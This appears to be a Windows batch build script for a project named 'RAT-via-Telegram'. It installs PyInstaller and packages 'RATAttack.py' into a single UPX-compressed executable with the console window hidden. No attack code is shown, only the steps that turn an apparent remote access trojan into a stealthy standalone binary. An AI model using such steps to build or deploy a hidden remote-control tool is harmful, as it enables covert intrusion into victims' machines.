rem --specpath "D:\Google Drive\Programming\Python\RAT-via-Telegram\" --distpath "D:\Google Drive\Programming\Python\RAT-via-Telegram\dist" --workpath "D:\Google Drive\Programming\Python\RAT-via-Telegram\build"
pip3 install pyinstaller
pyinstaller --clean --upx-dir "upx393w" --noconsole --onefile "%~dp0\RATAttack.py"
